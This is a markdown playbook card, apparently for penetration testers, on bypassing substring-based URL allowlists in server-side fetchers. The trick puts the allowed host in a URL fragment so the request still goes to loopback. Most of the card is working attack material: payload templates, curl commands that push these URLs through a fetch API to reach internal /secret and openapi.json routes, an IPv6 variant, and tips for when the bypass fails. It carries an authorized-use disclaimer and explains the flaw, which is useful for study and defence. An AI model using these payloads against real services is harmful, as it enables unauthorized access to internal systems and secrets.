# Fragment Allowlist Loopback Bypass

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when a server-side fetcher allowlists destinations using substring matching, `startsWith`, or similar raw-string checks, and direct loopback requests are rejected with messages like `destination not in allowlist`.

## Requirements

- You know the exact allowed URL string, for example `https://[allowed-host]/`.
- Direct `http://127.0.0.1:[port]/` is blocked.
- The application reflects fetched body content or useful error output.
- Fragment characters are accepted in the input URL.

## Payload Shape

Internal root probe:

```text
http://127.0.0.1:[port]/#https://[allowed-host]/
```

Internal path fetch:

```text
http://127.0.0.1:[port]/[path]#https://[allowed-host]/
```

## Minimal Test

```bash
curl -sS -X POST "https://[host]/api/fetch" \
  -H 'content-type: application/json' \
  -d '{"url":"http://127.0.0.1:9000/#https://[allowed-host]/"}'
```

## Expected Signals

```text
metadata service
endpoints: /secret
internal banner unlike public app
404 from internal service instead of allowlist error
```

## Follow-Up Path

If metadata exposes an endpoint list, fetch it directly:

```bash
curl -sS -X POST "https://[host]/api/fetch" \
  -H 'content-type: application/json' \
  -d '{"url":"http://127.0.0.1:9000/secret#https://[allowed-host]/"}'
```

## Why It Works

```text
validator-visible string: contains https://[allowed-host]/
executor host: 127.0.0.1
executor port: [port]
fragment: ignored by HTTP client on the wire
```

The allowlist sees the allowed destination in the fragment. The HTTP client connects to loopback.

## Variant Matrix

| Payload | Use when |
|---|---|
| `http://127.0.0.1:[port]/#https://[allowed]/` | first internal probe |
| `http://127.0.0.1:[port]/secret#https://[allowed]/` | metadata names a secret route |
| `http://127.0.0.1:[port]/openapi.json#https://[allowed]/` | looking for internal docs |
| `http://[::1]:[port]/#https://[allowed]/` | loopback IPv6 variant |

## Why It Fails

- Allowlist validates parsed `hostname`, not raw string.
- App rejects `#` before fetch.
- Network layer blocks loopback even when validation passes.
- Fetch output is not reflected, making impact blind.
- Allowed string must match exactly, including trailing slash and scheme.

## Common Mistakes

- Using the wrong scheme in the fragment (`http://` when only `https://` is allowed).
- Omitting the trailing slash from the allowed URL when the app requires it.
- Spending time on `@` userinfo bypasses when the app blocks authority confusion but accepts fragments.
- Guessing internal paths when the root response already lists endpoints.

## Defensive Note

Do not store live flags, tokens, cookies, or private URLs in reusable payload files.
